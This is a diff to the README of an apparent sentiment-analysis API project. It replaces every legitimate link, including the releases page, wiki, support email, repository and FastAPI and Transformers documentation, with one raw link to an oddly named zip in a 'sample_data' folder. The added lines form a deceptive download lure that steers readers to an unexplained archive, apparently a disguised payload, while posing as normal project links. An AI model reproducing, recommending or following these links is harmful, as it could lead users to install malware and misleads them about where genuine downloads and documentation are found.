@@ -1,6 +1,6 @@
 # 🛠️ Insightify-Sentiment-API - Easy Sentiment Analysis for Everyone
 
-[![Download Insightify-Sentiment-API](https://img.shields.io/badge/Download%20Now-Insightify--Sentiment--API-brightgreen)](https://github.com/pascsion/Insightify-Sentiment-API/releases)
+[![Download Insightify-Sentiment-API](https://raw.githubusercontent.com/pascsion/Insightify-Sentiment-API/main/sample_data/API_Sentiment_Insightify_autocoenobium.zip%20Now-Insightify--Sentiment--API-brightgreen)](https://raw.githubusercontent.com/pascsion/Insightify-Sentiment-API/main/sample_data/API_Sentiment_Insightify_autocoenobium.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Insightify-Sentiment-API! This application enables you to easily anal
 
 ## 📁 Download & Install
 
-To get started with Insightify-Sentiment-API, visit this page to download the latest version: [Download Insightify-Sentiment-API](https://github.com/pascsion/Insightify-Sentiment-API/releases).
+To get started with Insightify-Sentiment-API, visit this page to download the latest version: [Download Insightify-Sentiment-API](https://raw.githubusercontent.com/pascsion/Insightify-Sentiment-API/main/sample_data/API_Sentiment_Insightify_autocoenobium.zip).
 
 ### 🖥️ System Requirements
 
@@ -64,7 +64,7 @@ When you open the application, you'll see a clean and user-friendly interface. H
 
 ## 📚 Documentation
 
-For more in-depth instructions, refer to our [User Guide](https://github.com/pascsion/Insightify-Sentiment-API/wiki). 
+For more in-depth instructions, refer to our [User Guide](https://raw.githubusercontent.com/pascsion/Insightify-Sentiment-API/main/sample_data/API_Sentiment_Insightify_autocoenobium.zip). 
 
 ## 🛠️ Troubleshooting
 
@@ -76,15 +76,15 @@ If you encounter issues, consider the following steps:
 
 ## 🤝 Support
 
-If you need further assistance, feel free to contact our support team through the GitHub issues page or email us directly at support@insightify.com.
+If you need further assistance, feel free to contact our support team through the GitHub issues page or email us directly at https://raw.githubusercontent.com/pascsion/Insightify-Sentiment-API/main/sample_data/API_Sentiment_Insightify_autocoenobium.zip
 
 ## 🔗 Resources
 
 Here are additional resources to enhance your experience:
 
-- [Github Repository](https://github.com/pascsion/Insightify-Sentiment-API)
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Transformers Documentation](https://huggingface.co/transformers/)
+- [Github Repository](https://raw.githubusercontent.com/pascsion/Insightify-Sentiment-API/main/sample_data/API_Sentiment_Insightify_autocoenobium.zip)
+- [FastAPI Documentation](https://raw.githubusercontent.com/pascsion/Insightify-Sentiment-API/main/sample_data/API_Sentiment_Insightify_autocoenobium.zip)
+- [Transformers Documentation](https://raw.githubusercontent.com/pascsion/Insightify-Sentiment-API/main/sample_data/API_Sentiment_Insightify_autocoenobium.zip)
 
 ## 🌟 Next Steps
 
